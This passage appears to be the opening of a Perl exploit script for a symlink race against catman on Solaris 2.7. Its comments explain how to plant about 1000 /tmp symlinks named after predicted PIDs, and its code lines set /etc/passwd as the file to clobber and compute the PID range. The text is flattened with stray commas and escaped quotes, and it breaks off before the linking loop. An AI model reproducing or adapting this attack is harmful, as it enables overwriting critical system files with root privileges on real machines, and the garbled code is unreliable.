The idea of this script is to ，  # create a block of symlinks to the target file with ，  # the current PID as a starting point. Depending on ，  # what load your system has this creates 1000 files in ，  # /tmp as sman_ $ currentpid + 1000. ，  # The drawback is you would have to know around when root ，  # would be executing catman. A better solution would be ，  # to monitor for the catman process and create the link ，  # before catman creates the file. I think this is a ，  # really small window however. This worked on a patched ，  # Solaris 2.7 box ( August 2000 patch cluster )  ，  # SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW , Ultra-1 ，  # lwc @ vapid.betteros.org 11/21/2000 Vapid Labs. ，  $ clobber = \"/etc/passwd\" ;  # file to clobber ，  $ X=getpgrp (  )  ;  ，  $ Xc= $ X ;  # Constant ，  $ Y= $ X+1000 ;  # Constant",
